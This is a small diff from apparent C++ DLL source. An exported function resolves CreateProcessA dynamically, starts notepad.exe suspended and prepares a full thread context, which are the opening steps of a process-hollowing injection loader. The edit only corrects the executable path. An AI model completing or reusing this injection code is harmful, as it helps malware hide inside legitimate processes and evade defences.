@@ -57,7 +57,7 @@ extern "C" __declspec(dllexport) void coolboy()
     ) = (BOOL(*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION))
         GetProcAddress(hKernel32, "CreateProcessA");
 
-    pCreateProcess("C:\\Windows\\system32\\notepad", 0, 0, 0, FALSE,CREATE_SUSPENDED, 0, 0, &ci, &pei);
+    pCreateProcess("C:\\Windows\\system32\\notepad.exe", 0, 0, 0, FALSE,CREATE_SUSPENDED, 0, 0, &ci, &pei);
     
     LPVOID saplo;
     da.ContextFlags = CONTEXT_FULL;
